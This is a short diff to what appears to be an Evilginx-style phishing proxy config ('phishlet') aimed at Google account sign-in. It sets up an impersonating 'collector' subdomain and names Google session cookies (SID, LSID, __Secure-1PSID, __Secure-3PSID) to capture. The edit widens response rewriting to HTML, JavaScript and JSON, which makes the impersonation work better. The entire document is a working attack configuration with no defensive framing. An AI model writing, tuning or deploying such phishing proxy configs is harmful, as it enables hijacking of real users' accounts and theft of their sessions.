@@ -3,7 +3,7 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: 'collector-{{.Endpoint3}}', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
 sub_filters:
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', phish_sub: 'collector-{{.Endpoint3}}'}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', phish_sub: 'collector-{{.Endpoint3}}', mimes: ['text/html', 'application/javascript', 'application/x-javascript', 'application/json']}
 auth_tokens:
   - domain: '.google.com'
     keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID']
